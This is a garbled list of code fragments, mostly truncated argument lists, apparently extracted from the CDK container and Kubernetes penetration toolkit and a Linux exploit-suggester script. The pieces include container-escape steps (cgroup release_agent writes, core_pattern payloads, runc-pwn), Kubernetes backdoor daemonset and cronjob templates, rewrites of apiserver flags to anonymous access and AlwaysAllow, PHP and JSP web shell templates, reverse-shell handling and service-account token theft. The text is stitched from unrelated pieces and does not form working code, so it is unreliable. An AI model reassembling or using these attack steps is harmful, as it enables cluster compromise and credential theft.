+"(1, []byte{0x02, 0, 0, 0, 0, 0, 0, 0}"
+"(2, fmt.Sprintf(f, v..."
+"(AbsFilePath,<names in NameList>"
+"(BUILD_PATH, DEV_PATH.GO_BINARY"
+"(BannerContainer, os.Args[1:], BannerVersion"
+"(BlueBold.Sprint(""\n[  """
+"(CDK.BIN_PATH, CDK.REMOTE_HOST_PATH"
+"(CDK.BIN_PATH, SELFBUILD_K8S.REMOTE_HOST_PATH"
+"(CDK.REMOTE_HOST_PATH, cmd"
+"(CONFIG_*, sysctl entries, custom Bash commands"
+"(K8sMitmPayloadDeploy, ""${image}"", image, -1"
+"(K8sMitmPayloadDeploy, ""${port}"", port, -1"
+"(K8sMitmPayloadSvc, ""${ip}"", ip, -1"
+"(K8sMitmPayloadSvc, ""${port}"", port, -1"
+"(MaybeSuccessfulStatuscodeList, resp.StatusCode"
+"(SELFBUILD_K8S.HOST, SELFBUILD_K8S.USER, connect_kwargs=connect_kwargs"
+"(SELFBUILD_K8S.TARGET_POD, SELFBUILD_K8S.REMOTE_POD_PATH"
+"(SERVER.HOST, SERVER.USER, connect_kwargs=connect_kwargs"
+"(StartDir, func(path string, info os.FileInfo, err error"
+"([ ""$opt_skip_more_checks"" == ""false"" ] && echo -e ""${txtgrn}performed${txtrst}"" || echo -e ""${txtred}N/A${txtrst}"""
+"([ -n ""$ARCH"" ] && echo -e ""${txtgrn}$ARCH${txtrst}"" || echo -e ""${txtred}N/A${txtrst}"""
+"([ -n ""$DISTRO"" ] && echo -e ""${txtgrn}$DISTRO${txtrst}"" || echo -e ""${txtred}N/A${txtrst}"""
+"([ -n ""$OS"" ] && echo -e ""${txtgrn}$OS${txtrst}"" || echo -e ""${txtred}N/A${txtrst}"""
+"([ -n ""$pkgListFile"" ] && echo -e ""$pkgListFile"" || echo -e ""${txtred}N/A${txtrst}"""
+"([]CgroupInfo, error"
+"([]FromTo, 0"
+"([]FromTo, int"
+"([]MountInfo, len(ret"
+"([]byte(""a"""
+"([]byte(strings.TrimSuffix(key, ""\n"""
+"([]byte, error"
+"([]byte, udpBufSize"
+"([]int, 0"
+"([]int, 3"
+"([]kv, 0"
+"([]string, 0, len(addrs"
+"([]string, 0, len(cgroupLst"
+"([]string, 100"
+"([]string, error"
+"([^""]*?"
+"([^,]*\"
+"(\""client_secret\"":\\s*?\""[a-zA-Z0-9-_]{24}\"""
+"(_ context.Context, _, _ string"
+"(`""gitVersion"":.*?""(.*?"
+"(`""metadata"":{""name"":""(kube-apiserver\b[^""]*?"
+"(`("""
+"(`(""--allow-privileged\s*?=\s*?"
+"(`(""--anonymous-auth\s*?=\s*?"
+"(`(""--authorization-mode\s*?=\s*?"
+"(`(""--insecure-bind-address\s*?=\s*?"
+"(`(""--insecure-port\s*?=\s*?"
+"(`(""--secure-port\s*?=\s*?"
+"(`(^[\s\S]*?""command""[\s\:]*?\[[^\]]*?""kube-apiserver"""
+"(absPath, ""/merged"""
+"(absPath, ""merged"", localBundlePath"
+"(addCaps, c"
+"(addr, """", true"
+"(addr, args[0]"
+"(addr, args[0], false"
+"(addr, conf.K8sSATokenDefaultPath"
+"(addr, conf.K8sSATokenDefaultPath, false"
+"(addr, token, image, cmd, cron"
+"(addr, tokenPath, ""alpine:latest"", crontabCMD, ""kube-proxy"""
+"(addr, tokenPath, image, inputArgs, ""kube-proxy"""
+"(also translates ',' to '|' for easy handling multiple CVEs case - via extended regex"
+"(ans, ""ContainersRunning"""
+"(ans, cmd"
+"(api string, cmd string"
+"(args, "" """
+"(args, ""force-fuzz"""
+"(args, ""memory"""
+"(args[0], args[1], args[2]"
+"(args[0], args[1], args[2], args[3]"
+"(args[0], args[1], parallel, timeout"
+"(args[1], token"
+"(args[1], token, args[2]"
+"(args[2], 10, 64"
+"(availSubSys, subSysName"
+"(base string, start, end int, err error"
+"(body, ""Containers"""
+"(buf, response.Body"
+"(capHex, 16, 64"
+"(capTextList, CAPStringsList[i]"
+"(capability.DockerDefaultCaps, c"
+"(cat ""$CVELIST_FILE"" | grep -E ""$cve"""
+"(cat ""$pkglist_file"" | awk '{print $1""-""$2}'"
+"(cat ""$pkglist_file"" | awk '{print $2""-""$3}' | sed 's/:amd64//g'"
+"(cat ""$pkglist_file"""
+"(cginfo, CgroupInfo{hID, singleCG[1], singleCG[2], originalInfo}"
+"(chan bool, 1"
+"(chan os.Signal, 1"
+"(checkRequirement ""$REQ"" ""${array[0]}"""
+"(checkRequirement ""$REQ"""
+"(cli.Args[""<args>""].([]string"
+"(cmd string, subSystemName string"
+"(cmd, "" """
+"(cmd, ""\"""", ""\\\"""", -1"
+"(cmd, ""\n"", ""\\n"", -1"
+"(cmd, ""\t"", ""\\t"", -1"
+"(cmd, [], [], True"
+"(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True"
+"(cmd, subSysName"
+"(cmd, white_list, black_list, verbose=False"
+"(cmd1, [], [], False"
+"(cmd1, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True"
+"(cmdSlice[0], cmdSlice[1:]..."
+"(cmd_parsed, hide=bool(1 - verbose"
+"(cmd_parsed, white_list, black_list, verbose"
+"(cmd_parsed, white_list, black_list, verbose=False"
+"(conf.SensitiveEnvRegex, env"
+"(conf.SensitiveFileConf.StartDir, func(path string, info os.FileInfo, err error"
+"(conf.SensitiveProcessRegex, proc.Executable("
+"(conf.WebShellCodeJSP, ""$SECRET_PARAM"", param"
+"(conf.WebShellCodePHP, ""$SECRET_PARAM"", param"
+"(config.Network, config.Host, config.Port, config.Command"
+"(config.Network, udpNetwork"
+"(configJson, ""$SHELLCMD$"", payloadShellCmd, -1"
+"(conn, bytes.NewReader(buffer"
+"(conn, input.Text("
+"(conn, os.Stdin"
+"(content string, silent bool"
+"(content, ""kvs"""
+"(corePatternFile, corePatternPayload, 0644"
+"(cronJobConfig, ""$IMAGE"", image"
+"(cronJobConfig, ""$SCHEDULE_EXPR"", scheduleExpr"
+"(cronJobConfig, ""$SHELL_CMD"", inputArgs"
+"(crontab string, shellcmd string, header string"
+"(ctx, &M"
+"(curExePath, ""run"", ""mount-cgroup"", cmd, exploitSubSys"
+"(currentPath, name"
+"(data []byte, file string"
+"(data, -1"
+"(deviceCGroupPath, func(path string, info os.FileInfo, err error"
+"(deviceCGroupPath, os.ModePerm"
+"(deviceMarjor, deviceMinor"
+"(devices, info.Device"
+"(devicesAllow, ""a *:* rwm"""
+"(dockerAPIHttpPostData, ""<SHELL_CMD>"", cmd, -1"
+"(dpkg -l | awk '{print $2""-""$3}' | sed 's/:amd64//g'"
+"(e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*"
+"(echo ""$EXP"" | grep ""Comments: "" | cut -d' ' -f 2-"
+"(echo ""$EXP"" | grep ""Reqs: "" | cut -d' ' -f 2"
+"(echo ""$EXP"" | grep ""analysis-url: "" | awk '{print $2}'"
+"(echo ""$EXP"" | grep ""author: "" | cut -d' ' -f 2-"
+"(echo ""$EXP"" | grep ""bin-url: "" | awk '{print $2}'"
+"(echo ""$EXP"" | grep ""exploit-db: "" | awk '{print $2}'"
+"(echo ""$EXP"" | grep ""ext-url: "" | awk '{print $2}'"
+"(echo ""$EXP"" | grep ""src-url: "" | awk '{print $2}'"
+"(echo ""$EXP"" | grep -o -i ""(dos"""
+"(echo ""$EXP"" | sed -e '/^Name:/d' -e '/^Reqs:/d' -e '/^Tags:/d'"
+"(echo ""$EXP"" | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/D3L1m/g'"
+"(echo ""$EXP_TEMP"" | awk -F'Name:' '{print $1}'"
+"(echo ""$EXP_TEMP"" | sed 's/^[0-9]//g' | sed 's/D3L1m/\n/g'"
+"(echo ""$FEATURE"" | grep ""analysis-url: "" | awk '{print $2}'"
+"(echo ""$FEATURE"" | grep ""enabled: "" | awk -F'ed: ' '{print $2}'"
+"(echo ""$FEATURE"" | grep ""feature: "" | cut -d' ' -f 2-"
+"(echo ""$KERNEL_ALL"" | grep -E ""${tag_pkg_num}"""
+"(echo ""$NAME"" | cut -d' ' -f 2- | tr -d ' ("
+"(echo ""$NAME"" | grep '.*\[.*\].*' | cut -d 'm' -f2 | cut -d ']' -f1 | tr -d '[' | tr "","" ""|"""
+"(echo ""$PKG_LIST"" | grep -E -i ""^$pkgName-[0-9]+"" | head -1"
+"(echo ""$REQ"" | grep ""CONFIG_"""
+"(echo ""$TAG"" | cut -d'=' -f1"
+"(echo ""$TAG"" | cut -d'=' -f2"
+"(echo ""$pkg"" | grep -E -i -o -e '-[\.0-9\+:p]+[-\+]' | cut -d':' -f2 | sed 's/[\+-]//g' | sed 's/p[0-9]//g'"
+"(echo ""$src_url"" | grep -q 'www.exploit-db.com'"
+"(echo ""$sysctlCondition"" | awk -F ""$sign"" '{print $1}'"
+"(echo ""$sysctlCondition"" | awk -F ""$sign"" '{print $2}'"
+"(echo ""$tag_distro_num_all"" | cut -d'{' -f 2 | tr -d '}' | cut -d':' -f 1"
+"(echo ""$tag_distro_num_all"" | cut -d'{' -f 2 | tr -d '}' | cut -d':' -f 2"
+"(echo ""$tag_distro_num_all"" | grep '{'"
+"(echo ""$uname"" | awk '{print $(NF-1"
+"(echo ""$uname"" | awk '{print $3}' | cut -d '-' -f 1"
+"(echo ""$uname"" | awk '{print $3}'"
+"(echo ""${tags_array[@]}"" | grep ""$OS"""
+"(env, cmd, pattern, type"
+"(error, string"
+"(etcdCert, etcdCertKey"
+"(expScript, expPayload, 0777"
+"(f string, v ...interface{}"
+"(family, platform, osversion, ""kernel:"", kversion"
+"(fd, ""#!/proc/self/exe"""
+"(fd, h, 0"
+"(fields[1], "","""
+"(fields[2], "","""
+"(fields[2], "":"""
+"(fields[5], "","""
+"(file, true"
+"(filePath, shellcode"
+"(fileType, path"
+"(fmt.Errorf(""localAddresses: %v\n"", err.Error("
+"(fmt.Sprintf(""./%s"", target"
+"(fmt.Sprintf(""/proc/%d/gid_map"", reExecCmd.Process.Pid"
+"(fmt.Sprintf(""/proc/%d/setgroups"", reExecCmd.Process.Pid"
+"(fmt.Sprintf(""/proc/%d/uid_map"", reExecCmd.Process.Pid"
+"(fmt.Sprintf(""[%s] %s"", k, token"
+"(format string, v ...interface{}"
+"(fstring, ""runc"""
+"(fstring, ""runc-pwn"""
+"(gatewayHex, 0, 64"
+"(getopt --options $SHORTOPTS  --longoptions $LONGOPTS -- ""$@"""
+"(grep -E '\ [0-9]+\.' ""$pkglist_file"" | head -1"
+"(grep -E '\.el[1-9]+[\._]' ""$pkglist_file"" | head -1"
+"(grep -E '\.fc[1-9]+'i ""$pkglist_file"" | head -1"
+"(grep -E '\.mga[1-9]+' ""$pkglist_file"" | head -1"
+"(grep -s -E '^DISTRIB_RELEASE=|^VERSION_ID=' /etc/*-release | cut -d'=' -f2 | head -1 | tr -d '""'"
+"(grep ubuntu ""$pkglist_file"""
+"(head -1 ""$pkglist_file"" | grep 'Desired=Unknown/Install/Remove/Purge/Hold'"
+"(header string, filePath string, shellcode string"
+"(host, port"
+"(host, strconv.Itoa(port"
+"(hostPath, cmd"
+"(hostPath, shellCmd string"
+"(image string, port string"
+"(image, cmd_parsed, pattern, 'black'"
+"(image, cmd_parsed, pattern, 'white'"
+"(image, docker_args, cmd, white_list, black_list, verbose=False"
+"(image, targetPort"
+"(indexs, index"
+"(info, """", ""  """
+"(inodeID uint64, err error"
+"(input, "","""
+"(ip string, port int, timeout time.Duration"
+"(ip string, port string"
+"(ip, ""-"""
+"(ip, port, ps.timeout"
+"(ip, port, timeout"
+"(ipRange string, portRange []FromTo, parallel int64, timeout time.Duration"
+"(ipRange string, portRange string, parallel int64, timeoutMS int"
+"(ipRange, portFromTo, conf.TCPScannerConf.MaxParallel, timeout"
+"(ipRange, portFromTo, parallel, timeout"
+"(ipStart, ""."""
+"(ipd32, d32"
+"(ips, "","""
+"(j, ""upperdir="""
+"(json, ""${1}${3}"""
+"(json, ""${1}0.0.0.0${3}"""
+"(json, ""${1}9443${3}"""
+"(json, ""${1}9444${3}"""
+"(json, ""${1}AlwaysAllow${3}"""
+"(json, ""${1}true${3}"""
+"(json, ""--allow-privileged"""
+"(json, ""--anonymous-auth"""
+"(json, ""--authorization-mode"""
+"(json, ""--insecure-bind-address"""
+"(json, ""--insecure-port"""
+"(json, ""--secure-port"""
+"(json, ""metadata.annotations"""
+"(json, ""metadata.creationTimestamp"""
+"(json, ""metadata.labels.component"", gjson.Get(json, ""metadata.labels.component"""
+"(json, ""metadata.name"""
+"(json, ""metadata.name"", podName"
+"(json, ""metadata.resourceVersion"""
+"(json, ""metadata.selfLink"""
+"(json, ""metadata.uid"""
+"(json, ""spec.tolerations"""
+"(json, ""status"""
+"(json, `${1}""--allow-privileged=true"",${2}`"
+"(json, `${1}""--anonymous-auth=true"",${2}`"
+"(json, `${1}""--authorization-mode=AlwaysAllow"",${2}`"
+"(json, `${1}""--insecure-bind-address=0.0.0.0"",${2}`"
+"(json, `${1}""--insecure-port=9443"",${2}`"
+"(json, `${1}""--secure-port=9444"",${2}`"
+"(k, k8sTokenPath"
+"(k.Get(""key"""
+"(k.Get(""value"""
+"(k8sApp string, image string, shellCmd string, apiVersion string"
+"(k8sApp, image, inputArgs, apiVersion"
+"(k8sBackdoorDaemonsetJson, ""${API_VERSION}"", apiVersion, -1"
+"(k8sBackdoorDaemonsetJson, ""${IMAGE}"", image, -1"
+"(k8sBackdoorDaemonsetJson, ""${K8S_APP}"", k8sApp, -1"
+"(k8sBackdoorDaemonsetJson, ""${SHELL_CMD}"", shellCmd, -1"
+"(k8sDaemonsetApi, ""${API_VERSION}"", apiVersion, -1"
+"(k8sGetSATokenPodConf, ""${RHOST}"", rhost, -1"
+"(kernel config, sysctl"
+"(key string, color bool"
+"(key, func(t *testing.T"
+"(key, value string, color bool"
+"(kubectlPath string, args []string"
+"(kubectlPath, args..."
+"(kubectlPath, kubectlBinary, 0755"
+"(line, ""Cap"""
+"(line, ""[CVE"""
+"(lines, scanner.Text("
+"(lines[i], ""[CVE"""
+"(localBundlePath+""/config.json"", []byte(configJson"
+"(localBundlePath, os.ModePerm"
+"(lst[:], "","""
+"(m.Device, ""/"""
+"(m.Fstype, ""ext"""
+"(m.Opts, ""rw"""
+"(major, 10, 64"
+"(major, minor string"
+"(map[string]string, error"
+"(map[string]string, len(kvs"
+"(matched, ""3fffffffff"""
+"(matched, "":"""
+"(matched[1], 16, 64"
+"(method string, unixPath string, uri string, data string"
+"(method string, url string, data string"
+"(mi *util.MountInfo, filter string"
+"(mi.Major, mi.Minor"
+"(mi.MountPoint, filter"
+"(mi.Opts, "","""
+"(mi.SuperBlockOptions, "","""
+"(minor, 10, 64"
+"(mountDir, os.ModePerm"
+"(mountInfos, mi"
+"(mountPoint, randomeFilename"
+"(mountPointPath+""/release_agent"", []byte(hostPath+outFile"
+"(mountPointPath+subgroupName+""/cgroup.procs"", []byte(strconv.Itoa(addProcCmd.Process.Pid"
+"(mountPointPath+subgroupName+""/notify_on_release"", []byte(""1"""
+"(mountPointPath+subgroupName, DefaultFolderPerm"
+"(mountPointPath, DefaultFolderPerm"
+"(mountedDirs, mountDir"
+"(n int, err error"
+"(name string, exploit ExploitInterface"
+"(name string, task TaskInterface"
+"(neither of above, but"
+"(net.Conn, error"
+"(net.IP, 4"
+"(network, dailAddr"
+"(network, host string, port int, command bool"
+"(network, listenAddr"
+"(nil, BannerContainer"
+"(opt.Method, opt.Endpoint+opt.Api, bytes.NewBuffer([]byte(opt.PostData"
+"(opts.Method, opts.Url, bytes.NewBuffer([]byte(opts.PostData"
+"(opts.PostData, ""${RPORT}"", rport, -1"
+"(opts.PostData, ""${TARGET_SERVICE_ACCOUNT}"", targetServiceAccount, -1"
+"(or ""Your"""
+"(os.Args[0], os.Args[1:]..."
+"(os.Stderr, """", 0"
+"(os.Stdout, 1, 1, 1, ' ', tabwriter.AlignRight|tabwriter.Debug"
+"(os.Stdout, c"
+"(os.Stdout, conn"
+"(os.Stdout, string(buf"
+"(os.Stdout, true"
+"(out string, errStr string"
+"(out, []byte(tt.successStr"
+"(outFile, []byte(expShellText"
+"(outFile, []byte(resp"
+"(p []byte, encoding string"
+"(p, ""gbk"""
+"(p, true"
+"(p[:m], ""utf-8"""
+"(pacman -Q | awk '{print $1""-""$2}'"
+"(path string, cmd string"
+"(path string, content string"
+"(path string, content string, perm os.FileMode"
+"(path string, image string"
+"(path, content"
+"(path, d, 0666"
+"(path, os.O_TRUNC|os.O_WRONLY|os.O_CREATE, perm"
+"(path, os.O_WRONLY|os.O_APPEND, 0666"
+"(path, os.O_WRONLY|os.O_SYNC, 0200"
+"(port int, p FromTo"
+"(port, ""-"""
+"(port, p"
+"(procDir string, shellPayload string"
+"(procDir, shellPayload"
+"(r'/root/cdk-fabric dcurl get http://127.0.0.1:2375/info """"', ['ContainersRunning'], [], False"
+"(r'cat /etc/crontab', ['CDK auto exploit via docker.sock'], [], False"
+"(r'cat /etc/crontab', ['CDK auto exploit via mounted device in privileged container'], [], False"
+"(r'cp -f /etc/crontab_bak /etc/crontab', [], ['cp'], False"
+"(r'echo ""AKIA99999999999999AB"" > /tmp/ak-leakage', [], [], False"
+"(r'ls /tmp/auto-priv-cgroup', ['/tmp/auto-priv-cgroup'], [], False"
+"(r'ls /tmp/auto-shimpwn', ['/tmp/auto-shimpwn'], [], False"
+"(r'rm /tmp/ak-leakage', [], [], False"
+"(r'rm /tmp/auto-priv-cgroup', [], [], False"
+"(r'rm /tmp/auto-shimpwn', [], [], False"
+"(r'rm /tmp/docker-api-pwn', [], [], False"
+"(r'rm /tmp/docker-sock-pwn', [], [], False"
+"(r, "" - """
+"(ref, unix.O_RDONLY, 0"
+"(relStr, ""-"""
+"(relStr[:relIdx], ""."""
+"(releaseAgentPath+""/release_agent"", []byte(hostPath+outFile"
+"(res, a"
+"(resp, ""/api"""
+"(resp, ""APIGroupList"""
+"(resp, ""etcdcluster"""
+"(resp, ""etcdserver"""
+"(resp, ""items"""
+"(resp, ""kube-apiserver"""
+"(resp, ""kube-system"""
+"(resp, ""metadata.name"""
+"(resp, ""metadata.namespace"""
+"(resp, ""selfLink"""
+"(resp, ""spec.nodeName"""
+"(resp, -1"
+"(resp, `""code"":403`"
+"(resp, `""namespace""`"
+"(resp, false"
+"(resp, opt.Silent"
+"(resp1, opt.Silent"
+"(respText, -1"
+"(respText, logPageSubString"
+"(result, item"
+"(result.Header.XEnvoyPeerMetadataId, ""sidecar"""
+"(results, func(i, j int"
+"(results, srvs..."
+"(results[i].Target, results[j].Target"
+"(ret, strings.Trim(line, ""\n"""
+"(ret, verData"
+"(s []int, e int"
+"(s []string, e string"
+"(s, "","""
+"(s, 10, 64"
+"(sLst, v.OriginalInfo"
+"(scriptType string, path string"
+"(serverAddr string, tokenPath string"
+"(serverAddr string, tokenPath string, anonymous bool"
+"(serverAddr string, tokenPath string, image string, inputArgs string, k8sApp string"
+"(serverAddr string, tokenPath string, image string, inputArgs string, schedule string"
+"(serverVersion, ""-"""
+"(setuidfiles, dir + ""/"" + file.Name("
+"(shell, ""${hostPath}"", hostPath, -1"
+"(shell, ""${outputFile}"", outputFile, -1"
+"(shell, ""${shellCmd}"", shellCmd, -1"
+"(shellCmd string, rhost string, rport string"
+"(shellCmd, """", """""
+"(shellCommand, """", """""
+"(shellCommand, ""memory"""
+"(shellPath, ""/"""
+"(sigs, syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT"
+"(sock string, cmd string"
+"(sock, ""@"", """", -1"
+"(sock, ""alpine:latest"""
+"(sock, cmd"
+"(sock, shellCmd, rhost, rport string"
+"(sockname, shellCmd, rhost, rport"
+"(sortedExploits, func(i, j int"
+"(sortedExploits, kv{name, plugin.GetExploitType("
+"(srv.Target, srv.Port"
+"(stats, func(i, j int"
+"(string, error"
+"(string, string"
+"(string, string, error"
+"(strings.TrimSuffix(originalInfo, ""\n"""
+"(syses, v.ControllerLst"
+"(t, EnableSysPtraceCap(0x00000000a80425fb"
+"(t, EnableSysPtraceCap(0x00000000a80c25fb"
+"(t, EnableSysPtraceCap(0x0000003fffffffff"
+"(t, expParams, actParams, ""That should be equal"""
+"(t, expect, act, ""That should be equal"""
+"(t, strings.Contains(value, """""
+"(t, v.expected, IsDir(v.dir"
+"(t, v.expected, IsSoftLink(v.dir"
+"(tCellScreen, quit, userArg"
+"(target, ref string, chroot bool, cmd []string"
+"(target, ref, chroot, cmd"
+"(target, token string"
+"(target, token, cmd string"
+"(targetDir+subgroupName+""/cgroup.procs"", []byte(strconv.Itoa(addProcCmd.Process.Pid"
+"(targetDir+subgroupName+""/notify_on_release"", []byte(""1"""
+"(targetDir+subgroupName, DefaultFolderPerm"
+"(targetFile, filepath"
+"(targetIP, targetPort"
+"(targetMountPoint, ""cgroup/"", subSystemName"
+"(targetMountPoint, ""cgroup/devices"", podCgroupPath, devicesAllowName"
+"(targetMountPoint, ""cgroup/devices"", podCgroupPath, devicesListName"
+"(temp, v..."
+"(the ""License"""
+"(tmpDir, ""kubectl"""
+"(tmplist, k"
+"(token string, serverAddr string"
+"(token string, serverAddr string, namespace string, data string"
+"(token string, serverAddr string, podName string, namespace string"
+"(token, endpoint string"
+"(token, endpoint"
+"(token, targetServiceAccount, remoteIP, remotePort"
+"(tokenFlag, addr"
+"(tokenFlag, addr, ""kube-system"", data"
+"(tokenFlag, addr, apiServerPod, ""kube-system"""
+"(tokenPath string, targetServiceAccount string, rhost string, rport string"
+"(tt.name, func(t *testing.T"
+"(u.Host, "":""+u.Port("
+"(u.Path, ""/"""
+"(uri, ""application/json"", strings.NewReader(data"
+"(url string, username string, password string"
+"(url, cmd"
+"(util.GreenBold.Sprint(""\n[Information Gathering - System Info]\n"""
+"(v, ""#kubernetes.io/service-account-token"""
+"(v2URL, username, password"
+"(value string, color bool"
+"(writer io.Writer, colorful bool"
+"(writer, """", log.LstdFlags|log.Lshortfile"
+"(writer, ""TYPE \t NAME \t DESC"""
+"(writer, str"
+($(echo $REQ | cut -d'=' -f1
+($1
+($2
+($_POST['$SECRET_PARAM']
+(&buf
+(&errors.CDKRuntimeError{Err: err}
+(&mi
+(&result
+('-r' is used to not interpret backslash used for bash colors
+('[upload to host]'
+('[upload] CDK binary to K8s pod:{}'.format(K8S.TARGET_POD
+('[upload] CDK binary to self-build k8s master node'
+('\n'
+('chmod a+x {}'.format(CDK.REMOTE_HOST_PATH
+('chmod a+x {}'.format(SELFBUILD_K8S.REMOTE_HOST_PATH
+('done'
+('errors while update cdk binary.'
+('invoke UnexpectedExit'
+(($AVAILABLE_PASSED_REQ + 1
+(($ENABLE_PASSED_REQ + 1
+(($MODE + 1
+(($PASSED_REQ + 1
+(($RANK + 1
+(($RANK + 2
+(($RANK + 3
+(((ret1 & 0xfff
+((10#${ver1[i]} < 10#${ver2[i]}
+((10#${ver1[i]} > 10#${ver2[i]}
+((BASH_VERSINFO[0] < 4
+((i + 1
+((i=${#ver1[@]}; i<${#ver2[@]}; i++
+((i=0; i<${#ver1[@]}; i++
+((j++
+((n++
+((ret1 &^ 0xfff
+((ret2 & 0xfffff00
+()
+() ${bldblu}(DoS
+() * 1000
+() and umount(
+().(*syscall.Stat_t
+().xxx(
+()}
+(*syscall.Stat_t
+(+1
+(--list | <exploit> [<args>...]
+(--skip-more-checks
+(-k or --uname or -p modes
+(-k or --uname or -p set
+(.*
+(.*?
+(/proc/sys/kernel/unprivileged_userns_clone
+(0
+(0.5
+(0|2|6|8|10
+(1
+(10
+(10.04|10.10
+(10.04|11.10
+(10.04|9.10
+(12.04|14.04
+(12|15|19
+(13.04|13.10
+(13|16
+(14.04|15.10
+(14.04|16.04
+(14.10|15.04
+(14|19
+(14|21
+(16.04|17.04
+(18|19|20|21|22
+(18|24|33
+(19|21|24
+(19|28|45
+(1|2|trunk
+(1|trunk
+(2
+(2.5
+(20.04|21.04
+(2022-3
+(21|22|24|28|31|34|36|38|42|43|45|47|51
+(21|24
+(2375
+(23|29
+(256
+(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52
+(2|3|4|5
+(2|5
+(3
+(3 * time.Second
+(31|32
+(31|32|34|35
+(31|35
+(32|33|34|35
+(32|35
+(34|36|39|41|42|44|45
+(4
+(4|5
+(5
+(50%
+(6
+(7
+(8|10
+(8|11
+(9.10|10.10
+(<token_path>|anonymous|default
+(?i
+(ASLRSetting
+(AWS
+(BTF
+(BannerHeader
+(BannerTitle
+(CAPStringsList
+(CAP_DAC_READ_SEARCH
+(CDK.BUILD_CMD
+(CVE-2019-18862
+(CVE-2020-8554
+(CVE-2020-8558
+(Container DucK
+(Convert
+(Core
+(DIND attack
+(DSA
+(DebugPrefix
+(DoS
+(EC
+(ErrorPrefix
+(Evangelion
+(FilePath
+(FilePath string
+(GCP
+(InfoPrefix
+(KASLR
+(LKRG
+(NODE_NAME
+(OPENSSH
+(POD_NAMESPACE
+(PTI
+(RedBold.Sprint(value
+(RouteLocalNetProcPath
+(SMAP
+(SMEP
+(StartDir string
+(TBD
+(TV
+(WarnPrefix
+(YellowBold.Sprint(key
+([]byte(content
+([]byte(data
+([]byte(login
+([]byte(payload
+([]byte{0}
+([]string
+([^:]+
+([a-z0-9]+
+(\\n|$
+(`(?i
+(`(^[\s\S]*?
+(`/dev/mapper/[^/ ]+-([0-9a-fA-F]+
+(`\@/containerd-shim/[\w\d\/-]*?\.sock`
+(`workdir=((/[^/ ]+
+(a
+(abrt
+(addCaps
+(addr
+(addrs []string
+(also via NET_ADMIN
+(also via NET_RAW
+(an example is provided in the Appendix below
+(and not in '--uname' mode
+(ans
+(api
+(apiInstance.API
+(apiVersion
+(apiVersion string
+(apport
+(args
+(args ...string
+(args []string
+(args[0]
+(args[1]
+(args[2]
+(args[3]
+(ash/sash
+(associative arrays need Bash in version 4.0+
+(at least not in case of all distros
+(author of exploit at 'ext-url'
+(author of exploit at EDB 40839
+(author of exploit update at 'ext-url'
+(auto|<service-account-token-path>
+(b
+(b BaseExploit
+(based on exploits' rank
+(basename $i
+(basename $src_url
+(blockId
+(body
+(bool
+(buf
+(buf.Bytes(
+(bytes.Buffer
+(c
+(c io.Closer
+(c net.Conn
+(c net.PacketConn
+(caData
+(cache & letterIdxMask
+(capHex
+(capHex string
+(capStr
+(caps
+(cgroupInfoPath
+(chan struct{}
+(client
+(cmd
+(cmd string
+(cmdSlice []string
+(color.Bold
+(color.FgBlue
+(color.FgGreen
+(color.FgRed
+(color.FgYellow
+(conf.K8sSATokenDefaultPath
+(conf.TCPScannerConf.Timeout
+(conf.ThinIgnoreTool
+(config
+(conn
+(connectString
+(connectString string
+(content
+(context.TODO(
+(convert *Convert
+(currentCaps []string
+(currentPath
+(d
+(data
+(datafd
+(default|anonymous|<service-account-token-path>
+(default|anonymous|<token-path>
+(device
+(device string
+(devices
+(devices.allow
+(devicesAllowPath
+(devicesListPath
+(dir
+(displayExposure $RANK
+(docker ps -aq
+(docker ps -q
+(e
+(e *CDKRuntimeError
+(e.g. 1.2.3.4
+(ectlBanner
+(encoding
+(endTime.Sub(startTime
+(endpoint
+(endpoint string
+(err
+(err.Error(
+(etcdCa
+(even though 2.6 is also vulnerable
+(except as stated in this section
+(exim
+(exp ExploitUnprivUserNS
+(exp.Desc(
+(expShellText
+(exploit.Desc(
+(exploitSubSys
+(f
+(f func(
+(f.Name(
+(false
+(fbytes
+(fd
+(fi.Mode(
+(fields
+(file
+(fileInfo.Mode(
+(filePreString string
+(first field: 0
+(first line: 0
+(fmt.Sprintf(buffer.String(
+(fmt.Sprintln(err
+(for normal mode
+(fromTo
+(fromTo[0]
+(fromTo[1]
+(fstring
+(func(
+(fusermount
+(generic|server
+(get|post
+(gidMapStr
+(grpc
+(handle.Fd(
+(helps to avoid false negatives
+(hijackCommand string
+(host
+(hostPath
+(hostPath string
+(http
+(http://kcon.knownsec.com/2021/#/arsenal
+(https://community.cncf.io/events/details/cncf-kcd-china-presents-kubernetes-community-days-china/
+(https://conference.hitb.org/hitbsecconf2021ams/sessions/attacking-cloud-native-kubernetes-with-cdk/
+(https://github.com/404tk
+(https://github.com/404tk.png?size=40
+(https://github.com/cdk-team/CDK/discussions
+(https://github.com/cdk-team/CDK/issues
+(https://github.com/cdk-team/CDK/wiki/CDK-Home-CN
+(https://github.com/cdk-team/CDK/wiki/Evaluate:-Cloud-Provider-Metadata-API
+(https://github.com/cdk-team/CDK/wiki/Evaluate:-Commands-and-Capabilities
+(https://github.com/cdk-team/CDK/wiki/Evaluate:-K8s-API-Server
+(https://github.com/cdk-team/CDK/wiki/Evaluate:-K8s-Service-Account
+(https://github.com/cdk-team/CDK/wiki/Evaluate:-Mounts
+(https://github.com/cdk-team/CDK/wiki/Evaluate:-Net-Namespace
+(https://github.com/cdk-team/CDK/wiki/Evaluate:-Sensitive-Files
+(https://github.com/cdk-team/CDK/wiki/Evaluate:-Services
+(https://github.com/cdk-team/CDK/wiki/Evaluate:-System-Info
+(https://github.com/cdk-team/CDK/wiki/Evaluate:-check-net.ipv4.conf.all.route_localnet
+(https://github.com/cdk-team/CDK/wiki/Evaluate:-k8s-mitm-clusterip
+(https://github.com/cdk-team/CDK/wiki/Exploit:-Container-Image-Registry-Brute
+(https://github.com/cdk-team/CDK/wiki/Exploit:-abuse-unpriv-userns
+(https://github.com/cdk-team/CDK/wiki/Exploit:-ak-leakage
+(https://github.com/cdk-team/CDK/wiki/Exploit:-cap-dac-read-search
+(https://github.com/cdk-team/CDK/wiki/Exploit:-check-istio
+(https://github.com/cdk-team/CDK/wiki/Exploit:-check-ptrace
